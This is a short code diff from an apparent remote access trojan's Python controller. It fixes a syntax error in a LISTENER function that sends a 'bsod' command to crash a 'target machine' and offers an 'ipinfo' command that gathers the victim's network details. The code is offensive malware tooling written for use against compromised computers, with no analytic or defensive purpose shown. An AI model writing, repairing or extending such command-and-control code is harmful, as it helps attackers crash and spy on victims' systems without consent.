@@ -217,7 +217,7 @@ def LISTENER():
         if LISTENER_INPUT == "bsod":
            print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting BSOD mode on the target machine...\033[0m")
            time.sleep(2)
-           CONN.send("bsod".encode()
+           CONN.send("bsod".encode())
            
         if LISTENER_INPUT == "ipinfo":
            print(" \033[97;1m[\033[38;5;208m...\033[0m] Obtaining the IP address information of the target machine...\033[0m")
